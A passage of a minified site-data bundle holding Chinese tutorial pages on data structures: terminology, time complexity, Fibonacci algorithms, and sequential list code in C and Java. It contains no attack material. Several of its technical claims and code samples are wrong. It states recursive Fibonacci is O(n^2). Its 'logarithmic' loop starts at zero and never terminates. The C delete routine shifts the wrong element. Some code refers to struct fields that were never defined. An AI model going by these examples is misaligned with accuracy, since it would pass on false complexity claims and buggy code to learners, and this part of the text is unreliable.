}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n',charsets:{cjk:!0},lastUpdated:"2022/09/16, 05:50:03",lastUpdatedTimestamp:1663307403e3},{title:"【数据结构】概述",frontmatter:{title:"【数据结构】概述",date:"2022-05-04T20:00:00.000Z",permalink:"/dev/basic/ds/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","数据结构与算法"],tags:["数据结构"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1020.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/00.%E6%A6%82%E8%BF%B0.html",relativePath:"01.开发/102.计算机基础/1020.数据结构与算法/00.概述.md",key:"v-2595496f",path:"/dev/basic/ds/introduction/",headers:[{level:2,title:"术语和概念",slug:"术语和概念",normalizedTitle:"术语和概念",charIndex:33},{level:3,title:"数据、数据元素、数据项、数据对象",slug:"数据、数据元素、数据项、数据对象",normalizedTitle:"数据、数据元素、数据项、数据对象",charIndex:43},{level:3,title:"数据结构",slug:"数据结构",normalizedTitle:"数据结构",charIndex:3},{level:3,title:"数据类型和抽象数据类型",slug:"数据类型和抽象数据类型",normalizedTitle:"数据类型和抽象数据类型",charIndex:942},{level:3,title:"抽象数据类型的表示与实现",slug:"抽象数据类型的表示与实现",normalizedTitle:"抽象数据类型的表示与实现",charIndex:1159},{level:2,title:"算法和算法分析",slug:"算法和算法分析",normalizedTitle:"算法和算法分析",charIndex:1271},{level:3,title:"算法的定义",slug:"算法的定义",normalizedTitle:"算法的定义",charIndex:1283},{level:3,title:"算法的评价标准",slug:"算法的评价标准",normalizedTitle:"算法的评价标准",charIndex:1463},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:1613},{level:2,title:"斐波那契数列",slug:"斐波那契数列",normalizedTitle:"斐波那契数列",charIndex:2679}],excerpt:'<h1 id="【数据结构】概述"><a class="header-anchor" href="#【数据结构】概述">#</a> 【数据结构】概述</h1>\n<div class="custom-block note"><p class="custom-block-title">笔记</p>\n<p>基础不牢固，打打基础吧。</p>\n</div>\n',headersStr:"术语和概念 数据、数据元素、数据项、数据对象 数据结构 数据类型和抽象数据类型 抽象数据类型的表示与实现 算法和算法分析 算法的定义 算法的评价标准 时间复杂度 斐波那契数列",content:'# 【数据结构】概述\n\n笔记\n\n基础不牢固，打打基础吧。\n\n\n# 术语和概念\n\n\n# 数据、数据元素、数据项、数据对象\n\n * 数据：客观事物的符号表示，所有能够输入到计算机中并可以被计算机程序处理的符号的总称。比如：字符串、图像、声音等。\n * 数据元素：数据的基本单位。数据元素也称为元素、记录。可以理解为数据库的一条记录。\n * 数据项：组成数据元素的、有独立含义的、不可分割的最小单位。可以理解为数据库的某一列。\n * 数据对象：性质相同的数据元素的集合。是数据的子集。可以理解为数据库的一张表。\n\n\n# 数据结构\n\n> 数据结构是相互之间存在的一种或者多种特定关系的数据元素的集合。\n> \n> 数据结构是带结构的数据元素的集合，结构是数据之间的关系。\n\n# 1. 逻辑结构\n\n数据的逻辑结构是从 逻辑关系上描述数据，和数据的存储无关。可以看作是从具体问题中抽象出来的数学模型。逻辑结构的两个要素：数据元素、关系。通常存在以下四种数据的逻辑结构：\n\n * 集合结构\n   \n   数据元素之间除了属于同一个集合之外，无其他关系。例如：学生属于一个班级。\n   \n   \n\n * 线性结构\n   \n   数据之间存在一对一的关系。例如：排队和糖葫芦。\n   \n   \n\n * 树结构\n   \n   数据中存在一对多的关系。例如：族谱、组织结构等。\n   \n   \n\n * 图结构\n   \n   数据之间存在多对多的关系。如：人物关系图。\n   \n   \n\n> 集合、树、图都属于非线性结构。\n> \n> 线性结构包含：线性表、栈、队列、字符串、数据、广义表等。\n> \n> 非线性结构包含：树、二叉树、有向图和无向图。\n\n\n\n# 2. 存储结构\n\n> 数据对象如何存储在计算机中，称为数据的存储结构。也叫 物理结构。在数据存储到计算机时，既要存储元素也要存储关系。数据元素在计算机中有两种基本的存储结构：顺序存储结构和链式存储结构。\n\n * 顺序存储结构\n   \n   顺序存储结构借助数据在存储器中的相对位置来表示逻辑关系。\n\n * 链式存储结构\n   \n   顺序存储结构要求所有的存储空间连续。链式存储结构无需占用完整存储空间。数据节点之间通过指针字段表示数据关系。\n\n\n# 数据类型和抽象数据类型\n\n> 数据类型（DT）：高级程序设计怨言的一个基本概念。\n> \n> 抽象数据类型（ADT）：抽象出实际问题的本质。包含三部分：数据对象、数据对象上关系的集合、数据对象的基本操作集合。\n\n定义格式如下：\n\nADT 抽象数据类型名{\n\t数据对象：\n\t数据关系：\n\t基本操作：基本操作名（参数列表）\n\t\t\t\t\t\t初始条件：\n\t\t\t\t\t\t操作结果：\n}ADT 抽象数据类型名\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 抽象数据类型的表示与实现\n\n使用介于伪代码和C语言之间的类C语言作为后续的描述工具。具体语法不在赘述。\n\n以下是以复数为例，给出的一个完整的抽象数据类型的定义、表示和实现。\n\n定义：\n\n\n\n表示：\n\n\n\n实现：\n\n\n\n\n# 算法和算法分析\n\n\n# 算法的定义\n\n> 算法是为了解决某类问题而规定的有限长度的操作序列。\n\n算法必须满足如下的五个特性：\n\n * 有穷性：算法必须在执行有穷步数后结束\n * 确定性：对于每种情况下的操作，不会产生二义性\n * 可行性：算法中的所有操作都可以通过已经实现的操作运算的有限次操作完成\n * 输入：一个算法有0个或多个输入\n * 输出：一个算法有一个或多个输出\n\n\n# 算法的评价标准\n\n> 算法分析并非精确统计算法的实际执行时间，而是针对算法的执行次数进行估计。\n\n算法的评价包含以下的几个维度：\n\n * 正确性：在合理的数据输入下，总能得到正确的结果\n * 可读性：便于理解\n * 健壮性：输入非法数据，可以有效的处理\n * 高效性：包含时间和空间两个维度\n\n\n# 时间复杂度\n\n> 衡量算法效率的两种方式：事后统计法和事前分析法。事后统计法需要实现算法并执行，计算时间和空间的开销。这种方法存在两个弊端：必须实现、硬件依赖。\n\n# 问题规模和语句频度\n\n问题规模是算法求解问题输入量的多少，通常用 n表示。\n\n语句频度是一条语句重复执行的次数。\n\n# 时间复杂度的定义\n\n一般情况下，算法中的基本语句重复执行的次数是问题规模n的某个函数f(n)，算法的时间量可以表示为：\n\nT(n) = O(f(n))\n\n\n1\n\n\n随着问题规模n的逐渐增大，算法的执行时间的增长率和f(n)的增长率相同，称为算法的渐进时间复杂度，简称为时间复杂度。\n\n关于数学符号O的严格定义：\n\n若T(n)和f(n)是定义在正整数集合上的两个函数，则T(n)和O(f(n))表示存在正的常数C和n0，使得当n>= n0时，都满足0<=T(n)<=Cf(n).\n\n\n1\n\n\n没必要纠结这个严格的定义方式，只需要如何进行计算即可。以下是常见的时间复杂度：\n\n// 常量复杂度 O(1)\n{\n  x++;\n  s=0;\n}\n\n// 线性阶复杂度O(n)\nfor(i=0;i<n;i++){\n  x++;\n  s=0;\n}\n\n// 平方阶O(n2)\nx = 0;y = 0;\nfor(i=0;i<ni++){\n  for(j=0,j<n;j++){\n    printf("hello\\n");\n  }\n}\n\n// 对数阶O(log2n)\nfor(i=0;i<n;i+=i){\n  x++;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n常见的时间复杂度按照数量级递增排列为：\n\nO(1) < O(log2n) < O(n) < O(nlog2n) < O(n^2) < O(n^3) < …… < O(n^k) < O(2^n)\n\n\n1\n\n\n# 最好最坏时间复杂度\n\n算法在最好情况下的时间复杂度称为最好时间复杂度，指的是算法计算量可能达到的最小值；算法在最坏情况下的时间复杂度称为 最坏时间复杂度，指的是算法计算量达到的最大值。算法的 平均时间复杂度指的是算法在所有情况下的计算量的加权平均。\n\n# 算法空间复杂度\n\n一般情况下，一个程序在机器上执行，除了需要寄存本身的指令、常数、变量、输入数据意外，还需要一些队数据进行操作的辅助空间。如果算法执行时所需要的辅助空间对于输入量而言是常数，称为 原地工作，辅助空间为 O(1)。\n\n\n# 斐波那契数列\n\n斐波那契数 （通常用 F(n) 表示）形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是：\n\nF(0) = 0，F(1) = 1\nF(n) = F(n - 1) + F(n - 2)，其中 n > 1\n\n\n1\n2\n\n\n该题有两种算法，递归和迭代。\n\n递归算法，时间复杂度为O(n^2)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\n\n1\n2\n3\n4\n\n\n迭代算法，时间复杂度为O(n)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n\n  int first = 0;\n  int second = 1;\n\n  for (int i = 0; i < n - 1; i++) {\n    int sum = first + second;\n    first = second;\n    second = sum;\n  }\n  return second;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',normalizedContent:'# 【数据结构】概述\n\n笔记\n\n基础不牢固，打打基础吧。\n\n\n# 术语和概念\n\n\n# 数据、数据元素、数据项、数据对象\n\n * 数据：客观事物的符号表示，所有能够输入到计算机中并可以被计算机程序处理的符号的总称。比如：字符串、图像、声音等。\n * 数据元素：数据的基本单位。数据元素也称为元素、记录。可以理解为数据库的一条记录。\n * 数据项：组成数据元素的、有独立含义的、不可分割的最小单位。可以理解为数据库的某一列。\n * 数据对象：性质相同的数据元素的集合。是数据的子集。可以理解为数据库的一张表。\n\n\n# 数据结构\n\n> 数据结构是相互之间存在的一种或者多种特定关系的数据元素的集合。\n> \n> 数据结构是带结构的数据元素的集合，结构是数据之间的关系。\n\n# 1. 逻辑结构\n\n数据的逻辑结构是从 逻辑关系上描述数据，和数据的存储无关。可以看作是从具体问题中抽象出来的数学模型。逻辑结构的两个要素：数据元素、关系。通常存在以下四种数据的逻辑结构：\n\n * 集合结构\n   \n   数据元素之间除了属于同一个集合之外，无其他关系。例如：学生属于一个班级。\n   \n   \n\n * 线性结构\n   \n   数据之间存在一对一的关系。例如：排队和糖葫芦。\n   \n   \n\n * 树结构\n   \n   数据中存在一对多的关系。例如：族谱、组织结构等。\n   \n   \n\n * 图结构\n   \n   数据之间存在多对多的关系。如：人物关系图。\n   \n   \n\n> 集合、树、图都属于非线性结构。\n> \n> 线性结构包含：线性表、栈、队列、字符串、数据、广义表等。\n> \n> 非线性结构包含：树、二叉树、有向图和无向图。\n\n\n\n# 2. 存储结构\n\n> 数据对象如何存储在计算机中，称为数据的存储结构。也叫 物理结构。在数据存储到计算机时，既要存储元素也要存储关系。数据元素在计算机中有两种基本的存储结构：顺序存储结构和链式存储结构。\n\n * 顺序存储结构\n   \n   顺序存储结构借助数据在存储器中的相对位置来表示逻辑关系。\n\n * 链式存储结构\n   \n   顺序存储结构要求所有的存储空间连续。链式存储结构无需占用完整存储空间。数据节点之间通过指针字段表示数据关系。\n\n\n# 数据类型和抽象数据类型\n\n> 数据类型（dt）：高级程序设计怨言的一个基本概念。\n> \n> 抽象数据类型（adt）：抽象出实际问题的本质。包含三部分：数据对象、数据对象上关系的集合、数据对象的基本操作集合。\n\n定义格式如下：\n\nadt 抽象数据类型名{\n\t数据对象：\n\t数据关系：\n\t基本操作：基本操作名（参数列表）\n\t\t\t\t\t\t初始条件：\n\t\t\t\t\t\t操作结果：\n}adt 抽象数据类型名\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 抽象数据类型的表示与实现\n\n使用介于伪代码和c语言之间的类c语言作为后续的描述工具。具体语法不在赘述。\n\n以下是以复数为例，给出的一个完整的抽象数据类型的定义、表示和实现。\n\n定义：\n\n\n\n表示：\n\n\n\n实现：\n\n\n\n\n# 算法和算法分析\n\n\n# 算法的定义\n\n> 算法是为了解决某类问题而规定的有限长度的操作序列。\n\n算法必须满足如下的五个特性：\n\n * 有穷性：算法必须在执行有穷步数后结束\n * 确定性：对于每种情况下的操作，不会产生二义性\n * 可行性：算法中的所有操作都可以通过已经实现的操作运算的有限次操作完成\n * 输入：一个算法有0个或多个输入\n * 输出：一个算法有一个或多个输出\n\n\n# 算法的评价标准\n\n> 算法分析并非精确统计算法的实际执行时间，而是针对算法的执行次数进行估计。\n\n算法的评价包含以下的几个维度：\n\n * 正确性：在合理的数据输入下，总能得到正确的结果\n * 可读性：便于理解\n * 健壮性：输入非法数据，可以有效的处理\n * 高效性：包含时间和空间两个维度\n\n\n# 时间复杂度\n\n> 衡量算法效率的两种方式：事后统计法和事前分析法。事后统计法需要实现算法并执行，计算时间和空间的开销。这种方法存在两个弊端：必须实现、硬件依赖。\n\n# 问题规模和语句频度\n\n问题规模是算法求解问题输入量的多少，通常用 n表示。\n\n语句频度是一条语句重复执行的次数。\n\n# 时间复杂度的定义\n\n一般情况下，算法中的基本语句重复执行的次数是问题规模n的某个函数f(n)，算法的时间量可以表示为：\n\nt(n) = o(f(n))\n\n\n1\n\n\n随着问题规模n的逐渐增大，算法的执行时间的增长率和f(n)的增长率相同，称为算法的渐进时间复杂度，简称为时间复杂度。\n\n关于数学符号o的严格定义：\n\n若t(n)和f(n)是定义在正整数集合上的两个函数，则t(n)和o(f(n))表示存在正的常数c和n0，使得当n>= n0时，都满足0<=t(n)<=cf(n).\n\n\n1\n\n\n没必要纠结这个严格的定义方式，只需要如何进行计算即可。以下是常见的时间复杂度：\n\n// 常量复杂度 o(1)\n{\n  x++;\n  s=0;\n}\n\n// 线性阶复杂度o(n)\nfor(i=0;i<n;i++){\n  x++;\n  s=0;\n}\n\n// 平方阶o(n2)\nx = 0;y = 0;\nfor(i=0;i<ni++){\n  for(j=0,j<n;j++){\n    printf("hello\\n");\n  }\n}\n\n// 对数阶o(log2n)\nfor(i=0;i<n;i+=i){\n  x++;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n常见的时间复杂度按照数量级递增排列为：\n\no(1) < o(log2n) < o(n) < o(nlog2n) < o(n^2) < o(n^3) < …… < o(n^k) < o(2^n)\n\n\n1\n\n\n# 最好最坏时间复杂度\n\n算法在最好情况下的时间复杂度称为最好时间复杂度，指的是算法计算量可能达到的最小值；算法在最坏情况下的时间复杂度称为 最坏时间复杂度，指的是算法计算量达到的最大值。算法的 平均时间复杂度指的是算法在所有情况下的计算量的加权平均。\n\n# 算法空间复杂度\n\n一般情况下，一个程序在机器上执行，除了需要寄存本身的指令、常数、变量、输入数据意外，还需要一些队数据进行操作的辅助空间。如果算法执行时所需要的辅助空间对于输入量而言是常数，称为 原地工作，辅助空间为 o(1)。\n\n\n# 斐波那契数列\n\n斐波那契数 （通常用 f(n) 表示）形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是：\n\nf(0) = 0，f(1) = 1\nf(n) = f(n - 1) + f(n - 2)，其中 n > 1\n\n\n1\n2\n\n\n该题有两种算法，递归和迭代。\n\n递归算法，时间复杂度为o(n^2)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\n\n1\n2\n3\n4\n\n\n迭代算法，时间复杂度为o(n)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n\n  int first = 0;\n  int second = 1;\n\n  for (int i = 0; i < n - 1; i++) {\n    int sum = first + second;\n    first = second;\n    second = sum;\n  }\n  return second;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"【数据结构】线性表",frontmatter:{title:"【数据结构】线性表",date:"2022-05-06T23:00:00.000Z",permalink:"/dev/basic/ds/list",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","数据结构与算法"],tags:["数据结构","线性表"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1020.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.%E7%BA%BF%E6%80%A7%E8%A1%A8.html",relativePath:"01.开发/102.计算机基础/1020.数据结构与算法/01.线性表.md",key:"v-16c92313",path:"/dev/basic/ds/list/",headers:[{level:2,title:"定义和特点",slug:"定义和特点",normalizedTitle:"定义和特点",charIndex:86},{level:2,title:"线性表的类型定义",slug:"线性表的类型定义",normalizedTitle:"线性表的类型定义",charIndex:336},{level:2,title:"线性表的顺序表示和实现（C语言版）",slug:"线性表的顺序表示和实现-c语言版",normalizedTitle:"线性表的顺序表示和实现（c语言版）",charIndex:423},{level:3,title:"线性表的顺序存储表示",slug:"线性表的顺序存储表示",normalizedTitle:"线性表的顺序存储表示",charIndex:445},{level:3,title:"顺序表的基本操作",slug:"顺序表的基本操作",normalizedTitle:"顺序表的基本操作",charIndex:1091},{level:2,title:"线性表的顺序表示和实现（Java语言版）",slug:"线性表的顺序表示和实现-java语言版",normalizedTitle:"线性表的顺序表示和实现（java语言版）",charIndex:3861},{level:2,title:"线性表的链式表示和实现（Java语言版）",slug:"线性表的链式表示和实现-java语言版",normalizedTitle:"线性表的链式表示和实现（java语言版）",charIndex:11833},{level:3,title:"单链表的定义和表示",slug:"单链表的定义和表示",normalizedTitle:"单链表的定义和表示",charIndex:11858},{level:3,title:"单链表的基本操作的实现",slug:"单链表的基本操作的实现",normalizedTitle:"单链表的基本操作的实现",charIndex:12468},{level:3,title:"LeetCode-反转链表",slug:"leetcode-反转链表",normalizedTitle:"leetcode-反转链表",charIndex:17112},{level:3,title:"LeetCode - 判断链表是否有环",slug:"leetcode-判断链表是否有环",normalizedTitle:"leetcode - 判断链表是否有环",charIndex:18331},{level:3,title:"LeetCode-移除链表的元素",slug:"leetcode-移除链表的元素",normalizedTitle:"leetcode-移除链表的元素",charIndex:19248}],excerpt:'<h1 id="线性表"><a class="header-anchor" href="#线性表">#</a> 线性表</h1>\n<blockquote>\n<p>线性表和栈、队列、串以及数组都属于线性结构。线性结构基本特点是除了第一个元素无直接前驱、最后一个元素无直接后继，其他数据元素都有一个前驱和后继。</p>\n</blockquote>\n',headersStr:"定义和特点 线性表的类型定义 线性表的顺序表示和实现（C语言版） 线性表的顺序存储表示 顺序表的基本操作 线性表的顺序表示和实现（Java语言版） 线性表的链式表示和实现（Java语言版） 单链表的定义和表示 单链表的基本操作的实现 LeetCode-反转链表 LeetCode - 判断链表是否有环 LeetCode-移除链表的元素",content:'# 线性表\n\n> 线性表和栈、队列、串以及数组都属于线性结构。线性结构基本特点是除了第一个元素无直接前驱、最后一个元素无直接后继，其他数据元素都有一个前驱和后继。\n\n\n# 定义和特点\n\n生活中有很多线性表的例子，比如26个英文字母、学生信息表等等。他们的数据元素虽然不相同，但是同一个线性表中的元素必定有相同的特性。\n\n诸如此类由n(n>=0)个数据特性相同的元素构成的有限序列称为线性表。线性表中的n称为线性表的长度，n=0时则为空表。\n\n非空线性表通常有如下的特征：\n\n * 存在为一个被称为 第一个的数据元素\n * 存在唯一一个被称为 最后一个的数据元素\n * 除了第一个之外，每个元素都有且只有一个前驱\n * 除了最后一个之外，每个元素都有且只有一个后继\n\n\n# 线性表的类型定义\n\n线性表是一个十分灵活的数据结构，长度可根据需求增加或缩短，还可以对线性表的元素进行访问、删除、插入等操作。以下给出线性表的抽闲数据类型定义：\n\n\n\n\n# 线性表的顺序表示和实现（C语言版）\n\n\n# 线性表的顺序存储表示\n\n> 线性表的顺序表示指的是使用 一组连续地址的存储单元存储线性表的元素，这个表示也称为顺序存储结构或者顺序映像。通常这种存储结构的线性表称为 顺序表。逻辑上相邻的元素在物理次序上也是相邻的\n\n假设一个元素占用l个存储空间，并且占用的第一个存储地址作为元素存储的起始位置。则线性表中第i+1个元素的存储位置和第i个元素的存储位置之间的关系如下：\n\nLOC(ai+1) = LOC(ai) + l\n\n\n1\n\n * 线性表的第一个元素的起始位置LOC(a1)，通常称为线性表的起始位置或者基地址。\n * 每个元素的存储位置和元素在线性表中的位序成正比\n * 只要确定起始位置和元素大小，任意元素的位置都可随机存取\n * 因此线性表的顺序存储结构是一种 随机存取的存储结构。\n\n\n\n在高级程序设计语言中的数组有着类似的随机存取特性，因此通常使用数据描述数据结构中的顺序存储结构。C语言中的线性表可描述如下：\n\n#define MAXSIZE 100\ntypedef struct{\n  ElemType * elem;\n  int length;\n}SqList;\n\n\n1\n2\n3\n4\n5\n\n * 数组空间大小为MAXSIZE通过初始化动态分配得到，初始化之后Elem指针指向顺序表的基地址。\n * 元素类型ELemType可以根据实际类型进行定义。可以为int 、float登记本数据类型或者strut的结构体类型。\n * length表示顺序表中存在的元素个数。\n\n\n# 顺序表的基本操作\n\n# 0. 初始化\n\n> 顺序表的初始化操作是构造一个空的顺序表。\n\nvoid InitList(SqList *list){\n  // 分配空间\n  list->elem = (ElemType *)malloc((size_t)(sizeof(ElemType) * DEFAULT_CAPACITY));\n  if (list->elem == NULL){\n    printf("%s\\n",strerror(errno));\n    exit(-1);\n  }\n\n  // 初始化参数\n  list->size = 0;\n  list->capacity = DEFAULT_CAPACITY;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. 顺序表扩容\n\n> 当顺序表存储空间不足时，需要对顺序表进行扩容，这里定为扩容两倍大小。\n\nvoid SeqListExpand(SqList *list){\n  list->elem = (ElemType *)realloc(list->elem,2 * list->capacity * sizeof(ElemType));\n  if (list->elem == NULL){\n    error();\n  }\n  list->capacity = 2 * list->capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2. 取值\n\n> 取值操作是根据指定元素的位置序号i，获取顺序表中的第i个元素的值。\n\nElemType GetItem(SqList *list,int index){\n  if (index < 0 || index >= list->size){\n    // 长度异常报错\n    printf("%s\\n", strerror(errno));\n    exit(-2);\n  }\n  return list->elem[index];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. 查找\n\n> 查找元素是根据指定元素值e，查找顺序表中与给定e相等的元素的第一个位置，成功则返回位置序号，失败则返回-1。\n\nint LocateELem(SqList *list,ElemType elemType){\n  for (int i = 0; i < list->size; i++) {\n    if (elemType == list->elem[i]){\n      return i;\n    }\n  }\n  return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n当在顺序表中查找一个元素时，需要从头开始遍历顺序表，比较的次数则取决为元素在线性表中的位置。\n\n在查找时，为了确定元素在顺序表中的位置，需要和给定的值进行比较的数据元素个数的期望值称为查找算法阿兹查找成功时的平均查找长度（ASL）。\n\n假设pi是查找第i个元素的概率，Ci为找到表中其关键字与给定的相等的第i个记录时，和给定值已经比较过的关键字个数，则在长度为n的线性表中，查找成功时平均查找长度为：\n\n\n\n从查找的算法过程可知，当查找的元素是第一个记录时，只需要比较一次；当查找的元素为最后一个记录时，则需要比较n次。假设每个元素的查找概率相等，即pi = 1/n，则可以化简为：\n\n\n\n得出顺序表的值查找平均时间复杂度为O(n)\n\n# 4. 插入\n\n> 线性表的插入操作时在表的指定i位置插入一个新的元素e，并将长度为n的线性表变为n+1。\n\nElemType ListInsert(SqList *list, int index, ElemType elem){\n  // 判断索引是否正确\n  if (index < 0 || index > list->size){\n    error();\n  }\n\n  // 判断容量是否充足\n  if (list->size == list->capacity){\n    SeqListExpand(list);\n  }\n  //插入元素\n  // 末尾插入\n  if(index == list->size){\n    list->elem[index] = elem;\n    list-> size ++;\n    return NULL;\n  }else{\n    for (int i = list->size ; i > index ; i--) {\n      list->elem[i] = list->elem[i - 1];\n    }\n    ElemType oldElem = list->elem[index];\n    list->elem[index] = elem;\n    list->size ++;\n    return oldElem;\n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n根据分析，算法插入时的平均时间复杂度为O(n)。\n\n# 5. 删除指定位置的元素\n\n> 删除元素是指将指定索引位置的元素删除，并将该位置原本的元素返回。\n\nElemType ListDelete(SqList *list,int index){\n  if (index < 0 || index >= list->size){\n    error();\n  }\n  // 删除最后一个元素\n  if (index == list->size - 1){\n    ElemType oldElem = list->elem[index];\n    list->elem[index] = NULL;\n    list->size --;\n    return oldElem;\n  } else{\n    ElemType oldElem = list->elem[index];\n    for (int i = index; i < list->size - 1; ++i) {\n      list->elem[i] = list->elem[index + 1];\n    }\n    list->size --;\n    return oldElem;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n顺序表的删除算法平均时间复杂度为:O(n)。\n\n以上就是C语言实现的顺序表的关键操作，下面使用Java版本的实现。\n\n\n# 线性表的顺序表示和实现（Java语言版）\n\n> Java语言版的顺序表相对于C语言版的忽略了底层的一些操作。写法更为简单，同时Java语言的ArrayList实际上就是对顺序表的实现。\n\n以下是Java版本的全部代码(不使用范型)：\n\npackage com.pwddd.list;\n\npublic class ArrayList {\n\n  private static final int ELEMENT_NOT_FOUND = -1;\n  private int[] elems;\n  private int size;\n  private static final int DEFAULT_CAPACITY = 10;\n\n  /**\n     * 指定大小进行初始化\n     *\n     * @param capacity 自定义大小\n     */\n  public ArrayList(int capacity) {\n    capacity = capacity > DEFAULT_CAPACITY ? capacity : DEFAULT_CAPACITY;\n    elems = new int[capacity];\n  }\n\n\n  /**\n     * 默认初始化\n     */\n  public ArrayList() {\n    this(DEFAULT_CAPACITY);\n  }\n\n  /**\n     * 清除所有元素\n     */\n  public void clear() {\n    // 对于int类型而言，只需要让size=0 无法访问即可\n    // 如果是对象类型则为了让垃圾收集器工作，则需要设置为null\n    size = 0;\n  }\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(int element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(int element) {\n    add(size,element);\n  }\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index  指定的索引位置\n     * @return 索引位置的元素\n     */\n  public int get(int index) {\n    checkIndex(index);\n    return elems[index];\n  }\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  public int set(int index, int element) {\n    checkIndex(index);\n    int oldElem = elems[index];\n    elems[index] = element;\n    return oldElem;\n  }\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  public void add(int index, int element) {\n    checkIndexForAdd(index);\n    ensureCapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  public int remove(int index) {\n    checkIndex(index);\n    int oldElem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    size --;\n    return oldElem;\n  }\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  public int indexOf(int element) {\n    for (int i = 0; i < size ; i++){\n      if (elems[i] == element){\n        return i;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * 保证要有capacity的容量\n     *\n     * @param capacity 当前容量\n     */\n  private void ensureCapacity(int capacity) {\n    int oldCapacity = elems.length;\n    if (oldCapacity >= capacity) return;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    int[] newElems = new int[newCapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newElems[i] = elems[i];\n    }\n    elems = newElems;\n  }\n\n  private void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  private void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  